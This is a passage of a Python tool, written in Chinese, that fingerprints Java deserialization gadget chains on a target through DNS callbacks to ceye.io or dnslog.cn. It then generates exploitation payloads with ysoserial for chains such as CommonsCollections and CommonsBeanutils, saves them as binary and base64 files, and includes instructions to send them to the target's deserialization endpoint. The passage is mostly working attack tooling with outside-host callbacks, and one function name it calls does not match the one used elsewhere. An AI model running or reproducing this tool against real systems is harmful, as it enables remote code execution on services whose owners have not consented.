    print(f"  关键类:")
    for cls in c.required_classes:
        print(f"    • {cls}")
    if c.note:
        print(f"  备注: {c.note}")
    if c.alternatives:
        print(f"  替代方案: {', '.join(c.alternatives)}")


def interactive_menu(detected: Dict[str, bool], dnslog: DNSLogBase,
                     ysoserial_path: Optional[str] = None):
    """交互式菜单：选择并生成利用 payload"""
    available = [k for k, v in detected.items() if v and k != "URLDNS"]

    while True:
        print(color(f"\n  {'='*50}", "cyan"))
        print(color("  交互式菜单", "bold"))
        print(f"  1. 查看检测结果")
        print(f"  2. 查看特定链的详细信息")
        print(f"  3. 为检测到的链生成利用 payload")
        print(f"  4. 为指定链生成利用 payload (含未检测到的)")
        print(f"  5. 导出检测报告 (JSON)")
        print(f"  q. 退出")
        choice = input(color("\n  > 请选择 [1-5/q]: ", "green")).strip()

        if choice == "1":
            show_detected_summary(detected)

        elif choice == "2":
            if not available:
                print(color("  [-] 没有检测到可用链", "yellow"))
                continue
            print(color("\n  可用链:", "yellow"))
            for i, cn in enumerate(available, 1):
                print(f"    {i}. {cn}")
            sel = input(color("  > 输入序号或链名: ", "green")).strip()
            if sel.isdigit() and 1 <= int(sel) <= len(available):
                show_chain_details(available[int(sel)-1])
            elif sel in GADGET_CHAINS:
                show_chain_details(sel)
            else:
                print(color("  [!] 无效选择", "red"))

        elif choice == "3":
            if not available:
                print(color("  [-] 没有检测到可用链", "yellow"))
                continue
            print(color(f"\n  检测到 {len(available)} 条可用链:", "bold"))
            for i, cn in enumerate(available, 1):
                c = GADGET_CHAINS[cn]
                alt_info = f"  ← 替代: {', '.join(c.alternatives)}" if c.alternatives else ""
                print(f"    {i}. {cn:30s} [{c.java_versions}]{alt_info}")

            # 智能分组提示
            groups = _group_chains(available)
            if groups:
                print(color("\n  💡 智能分组建议:", "yellow"))
                for label, chains in groups.items():
                    print(f"    {label}: {', '.join(chains)}")

            sel = input(color("\n  > 输入要生成的链名 (多个用逗号分隔, 回车=全部): ", "green")).strip()
            if not sel:
                to_generate = available
            else:
                to_generate = [s.strip() for s in sel.split(",")]
                invalid = [s for s in to_generate if s not in GADGET_CHAINS]
                if invalid:
                    print(color(f"  [!] 无效链名: {invalid}", "red"))
                    continue

            print(color(f"\n  [*] 准备生成 {len(to_generate)} 条链的利用 payload:", "bold"))
            output_dir = input(color("  > 输出目录 (默认=exploit_output): ", "green")).strip() or "exploit_output"
            os.makedirs(output_dir, exist_ok=True)

            # 每个 payload 使用唯一子域名 (方便追踪)
            tag = ''.join(random.choices(string.ascii_lowercase, k=6))
            base_domain = dnslog.get_subdomain()

            for cn in to_generate:
                subdomain = f"{cn.lower()}.{tag}.{base_domain}"
                url = f"http://{subdomain}"
                if cn == "URLDNS":
                    raw = build_urldns_payload(url)
                elif ysoserial_path:
                    raw = generate_chain_payload(cn, url, ysoserial_path)
                else:
                    print(color(f"  [!] {cn}: 需要 ysoserial.jar", "red"))
                    continue

                if raw:
                    fname = os.path.join(output_dir, f"{cn}.bin")
                    with open(fname, "wb") as f:
                        f.write(raw)
                    b64 = base64.b64encode(raw).decode()
                    fname_b64 = os.path.join(output_dir, f"{cn}.b64")
                    with open(fname_b64, "w") as f:
                        f.write(b64)
                    print(color(f"  [+] {cn:25s} → {fname}", "green"))

        elif choice == "4":
            print(color("\n  所有已知链:", "yellow"))
            all_names = sorted(GADGET_CHAINS.keys())
            for i, (cn) in enumerate(all_names, 1):
                status = color("✓", "green") if detected.get(cn) else color("✗", "red")
                print(f"    {i:2d}. {status} {cn}")

            sel = input(color("\n  > 输入要生成的链名 (多个用逗号分隔): ", "green")).strip()
            to_generate = [s.strip() for s in sel.split(",")]
            invalid = [s for s in to_generate if s not in GADGET_CHAINS]
            if invalid:
                print(color(f"  [!] 无效链名: {invalid}", "red"))
                continue

            output_dir = input(color("  > 输出目录: ", "green")).strip() or "exploit_output"
            os.makedirs(output_dir, exist_ok=True)
            tag = ''.join(random.choices(string.ascii_lowercase, k=6))
            base_domain = dnslog.get_subdomain()

            for cn in to_generate:
                subdomain = f"{cn.lower()}.{tag}.{base_domain}"
                url = f"http://{subdomain}"
                if cn == "URLDNS":
                    raw = build_urldns_payload(url)
                elif ysoserial_path:
                    raw = generate_chain_payload(cn, url, ysoserial_path)
                else:
                    print(color(f"  [!] {cn}: 需要 ysoserial.jar", "red"))
                    continue
                if raw:
                    fname = os.path.join(output_dir, f"{cn}.bin")
                    with open(fname, "wb") as f:
                        f.write(raw)
                    b64 = base64.b64encode(raw).decode()
                    fname_b64 = os.path.join(output_dir, f"{cn}.b64")
                    with open(fname_b64, "w") as f:
                        f.write(b64)
                    print(color(f"  [+] {cn:25s} → {fname}", "green"))

        elif choice == "5":
            report = {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "total_chains": len(detected),
                "detected": {k: v for k, v in detected.items() if v},
                "not_detected": [k for k, v in detected.items() if not v],
                "chain_details": {}
            }
            for cn, is_det in detected.items():
                if is_det and cn in GADGET_CHAINS:
                    c = GADGET_CHAINS[cn]
                    report["chain_details"][cn] = {
                        "description": c.description,
                        "java_versions": c.java_versions,
                        "required_libs": c.required_libs,
                        "risk": c.risk,
                        "alternatives": c.alternatives,
                        "note": c.note,
                    }

            fname = "detection_report.json"
            with open(fname, "w", encoding="utf-8") as f:
                json.dump(report, f, ensure_ascii=False, indent=2)
            print(color(f"\n  [+] 报告已导出 → {fname}", "green"))

        elif choice.lower() == "q":
            print(color("\n  Bye!", "cyan"))
            break
        else:
            print(color("  [!] 无效选项", "red"))


def _group_chains(available: List[str]) -> Dict[str, List[str]]:
    """智能分组：将可用链按组件分组，标识冲突/替代关系"""
    groups = {}
    cc3_chains = [c for c in available if c.startswith("CommonsCollections") and c not in ("CommonsCollections2", "CommonsCollections4")]
    cc4_chains = [c for c in available if c in ("CommonsCollections2", "CommonsCollections4")]
    spring_chains = [c for c in available if c.startswith("Spring")]
    hibernate_chains = [c for c in available if c.startswith("Hibernate")]

    if cc3_chains:
        groups["CommonsCollections 3.x"] = cc3_chains
    if cc4_chains:
        groups["CommonsCollections 4.x"] = cc4_chains
    if spring_chains:
        groups["Spring Framework"] = spring_chains
    if hibernate_chains:
        groups["Hibernate"] = hibernate_chains

    # 其他独立链
    grouped = set()
    for g in groups.values():
        grouped.update(g)
    others = [c for c in available if c not in grouped]
    if others:
        groups["其他组件"] = others

    return groups


# ============================================================================
#  CLI 入口
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Java 反序列化组件检测工具 (DNS Exfiltration)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
示例:
  # 交互式模式 (推荐)
  python java_deser_detect.py --interactive

  # 使用 ceye.io 生成所有检测 payload
  python java_deser_detect.py --dnslog ceye --token <api_token> --identifier <your_id>

  # 使用 dnslog.cn 生成检测 payload
  python java_deser_detect.py --dnslog dnslogcn

  # 仅生成 URLDNS payload (无需 Java)
  python java_deser_detect.py --urldns http://abc.ceye.io

  # 生成特定链的利用 payload
  python java_deser_detect.py --dnslog ceye --token xxx --identifier yyy --chains CC6,CB1

  # 指定 ysoserial.jar 路径 (默认搜索当前目录和 ~/)
  python java_deser_detect.py --dnslog ceye --token xxx --identifier yyy --ysoserial /path/to/ysoserial.jar
        """)
    )
    parser.add_argument("--interactive", "-i", action="store_true",
                        help="进入交互式利用菜单")
    parser.add_argument("--dnslog", choices=["ceye", "dnslogcn"],
                        help="DNSLog 平台: ceye / dnslogcn")
    parser.add_argument("--token", help="ceye.io API Token")
    parser.add_argument("--identifier", help="ceye.io Identifier (子域名前缀)")
    parser.add_argument("--urldns", help="仅生成 URLDNS payload，参数为 DNS 回调地址")
    parser.add_argument("--chains", help="指定要生成的链名，逗号分隔 (如 CC1,CC6,CB1)")
    parser.add_argument("--output", "-o", default="payloads", help="payload 输出目录 (默认: payloads)")
    parser.add_argument("--ysoserial", help="ysoserial.jar 路径")
    parser.add_argument("--poll-interval", type=int, default=5,
                        help="DNS 轮询间隔 (秒, 默认5)")
    parser.add_argument("--max-wait", type=int, default=60,
                        help="最长等待时间 (秒, 默认60)")
    parser.add_argument("--list-chains", action="store_true",
                        help="列出所有支持的 Gadget Chain 及其信息")

    args = parser.parse_args()

    print_banner()

    # --list-chains
    if args.list_chains:
        print(f"\n  共 {len(GADGET_CHAINS)} 条已知链:\n")
        for cn in sorted(GADGET_CHAINS.keys()):
            c = GADGET_CHAINS[cn]
            cat_color = {"RCE": "red", "JNDI": "yellow", "Info": "cyan",
                        "FileWrite": "blue", "FileRead": "green"}.get(c.category, "reset")
            print(f"  {color(cn, 'green'):35s} [{color(c.category, cat_color)}] {c.description}")
            if c.java_versions != "全版本":
                print(f"  {'':35s}  JDK: {c.java_versions}")
        return

    # --urldns 模式
    if args.urldns:
        print(f"  [*] 生成 URLDNS payload → {args.urldns}")
        raw = build_urldns_payload(args.urldns)
        fname = os.path.join(args.output, "URLDNS.bin")
        os.makedirs(args.output, exist_ok=True)
        with open(fname, "wb") as f:
            f.write(raw)
        b64 = base64.b64encode(raw).decode()
        fname_b64 = os.path.join(args.output, "URLDNS.b64")
        with open(fname_b64, "w") as f:
            f.write(b64)
        print(color(f"  [+] Payload 已生成:", "green"))
        print(f"      binary:  {fname} ({len(raw)} bytes)")
        print(f"      base64:  {fname_b64}")
        print(f"\n  [*] 使用方式:")
        print(f"      将 payload 发送到目标的 Java 反序列化端点")
        print(f"      如果收到 DNS 回连，说明反序列化端点存在")
        return

    # 需要 DNSLog 平台
    if not args.dnslog:
        parser.print_help()
        print(color("\n  [!] 请指定 --dnslog 平台 或使用 --urldns", "red"))
        return

    # 初始化 DNSLog
    if args.dnslog == "ceye":
        if not args.token or not args.identifier:
            print(color("  [!] ceye.io 需要 --token 和 --identifier", "red"))
            print("  注册: http://ceye.io/profile → 获取 Identifier 和 API Token")
            return
        dnslog = CeyeDNSLog(args.identifier, args.token)
        print(f"  [*] DNSLog 平台: ceye.io ({args.identifier})")

    elif args.dnslog == "dnslogcn":
        dnslog = DNSLogCn()
        if not dnslog.domain:
            print(color("  [!] 无法获取 dnslog.cn 域名，请检查网络", "red"))
            return
        print(f"  [*] DNSLog 平台: dnslog.cn ({dnslog.domain})")

    # 检查环境
    java_ok = check_java()
    ysoserial_path = args.ysoserial or check_ysoserial()

    print(f"  [*] Java:       {'✓' if java_ok else '✗ (仅支持URLDNS)'}")
    print(f"  [*] ysoserial:  {'✓ ' + ysoserial_path if ysoserial_path else '✗ (将跳过需要ysoserial的链)'}")

    # 指定链模式
    if args.chains:
        target_chains = [c.strip() for c in args.chains.split(",")]
        invalid = [c for c in target_chains if c not in GADGET_CHAINS]
        if invalid:
            # 支持简写映射
            alias_map = {
                "CC1": "CommonsCollections1", "CC2": "CommonsCollections2",
                "CC3": "CommonsCollections3", "CC4": "CommonsCollections4",
                "CC5": "CommonsCollections5", "CC6": "CommonsCollections6",
                "CC7": "CommonsCollections7", "CB1": "CommonsBeanutils1",
                "Rhino1": "MozillaRhino1", "Rhino2": "MozillaRhino2",
                "JBoss": "JBossInterceptors1",
            }
            new_targets = [alias_map.get(c, c) for c in target_chains]
            invalid2 = [c for c in new_targets if c not in GADGET_CHAINS]
            if invalid2:
                print(color(f"  [!] 无效链名: {invalid2}", "red"))
                return
            target_chains = new_targets

        print(f"\n  [*] 生成指定链的 payload ({len(target_chains)} 条)...")
        generate_payload_files_for(dnslog, target_chains, args.output, ysoserial_path)

    else:
        # 全量检测模式
        print(f"\n  [*] 生成所有已知链的检测 payload ({len(GADGET_CHAINS)} 条)...")
        payload_files = generate_payload_files(dnslog, args.output, ysoserial_path)

        print(color(f"\n  {'='*50}", "cyan"))
        print(color("  [*] Payload 生成完毕！接下来：", "bold"))
        print(f"  1. 将 {args.output}/ 目录下的 .bin 或 .b64 文件逐个发送到目标反序列化端点")
        print(f"  2. 运行本工具监控 DNS 回连:")
        print(f"     python {sys.argv[0]} --dnslog {args.dnslog} --token {args.token or 'XXX'} --identifier {args.identifier or 'XXX'} --chains $(echo *.bin)")
        print(f"  3. 或者进入交互式菜单手动管理:")
        print(f"     python {sys.argv[0]} --interactive --dnslog {args.dnslog} --token {args.token or 'XXX'} --identifier {args.identifier or 'XXX'}")

    # 交互式模式
    if args.interactive:
        print(color("\n  [*] 进入交互式模式...", "cyan"))
        print(color("  提示: 先发送 payload 到目标，然后在此模式下轮询检测结果", "yellow"))
        print(color("  你也可以直接进入菜单生成利用 payload (4-指定链)", "yellow"))

        # 先检测哪些链可用
        all_chains = list(GADGET_CHAINS.keys())
        detect = input(color("\n  > 是否先进行 DNS 回连检测? [Y/n]: ", "green")).strip().lower()
        if detect != "n":
            detected = detect_components(dnslog, all_chains,
                                        args.poll_interval, args.max_wait)
            show_detected_summary(detected)
        else:
            # 手动输入已检测到的链
            print(color("  输入已知可用的链名 (逗号分隔): ", "yellow"))
            manual = input(color("  > ", "green")).strip()
            detected = {cn: False for cn in all_chains}
            if manual:
                for cn in manual.split(","):
                    cn = cn.strip()
                    if cn in GADGET_CHAINS:
                        detected[cn] = True

        # 进入交互菜单
        interactive_menu(detected, dnslog, ysoserial_path)


def generate_payload_files_for(dnslog: DNSLogBase, chains: List[str],
                                output_dir: str, ysoserial_path: Optional[str] = None):
    """为指定链列表生成 payload"""
    os.makedirs(output_dir, exist_ok=True)
    base_domain = dnslog.get_subdomain()

    for chain_name in chains:
        if chain_name == "URLDNS":
            subdomain = f"urldns.{base_domain}"
            url = f"http://{subdomain}"
            raw = generate_urldns_payload(url)
        elif ysoserial_path:
            subdomain = f"{chain_name.lower()}.{base_domain}"
            url = f"http://{subdomain}"
            raw = generate_chain_payload(chain_name, url, ysoserial_path)
        else:
            print(f"  [!] {chain_name}: 需要 ysoserial.jar")
            continue

        if raw:
            fname = os.path.join(output_dir, f"{chain_name}.bin")
            with open(fname, "wb") as f:
                f.write(raw)
            b64 = base64.b64encode(raw).decode()
            fname_b64 = os.path.join(output_dir, f"{chain_name}.b64")
            with open(fname_b64, "w") as f:
                f.write(b64)
            print(f"  [+] {chain_name:35s} → {fname} ({len(raw)} bytes)")


if __name__ == "__main__":
    main()
